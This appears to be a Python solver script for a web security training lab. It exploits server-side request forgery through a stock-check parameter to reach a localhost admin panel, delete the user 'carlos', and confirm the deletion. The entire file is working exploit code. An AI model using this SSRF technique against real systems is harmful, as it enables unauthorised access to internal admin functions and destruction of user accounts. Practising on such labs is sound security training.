#!/usr/bin/env python3

import sys
from typing import Dict

import requests
import urllib3

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES: Dict[str, str] = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def delete_user(url: str) -> None:
    check_stock_path = '/product/stock'
    delete_user_url_ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    admin_ssrf_payload = 'http://localhost/admin'

    # Attempt to delete user
    params = {'stockApi': delete_user_url_ssrf_payload}
    requests.post(
        f"{url}{check_stock_path}",
        data=params,
        verify=False,
        proxies=PROXIES
    )

    # Check if user was deleted
    params = {'stockApi': admin_ssrf_payload}
    response = requests.post(
        f"{url}{check_stock_path}",
        data=params,
        verify=False,
        proxies=PROXIES
    )

    if 'User deleted successfully' in response.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")


def main() -> None:
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Deleting Carlos user...")
    delete_user(url)


if __name__ == "__main__":
    main()
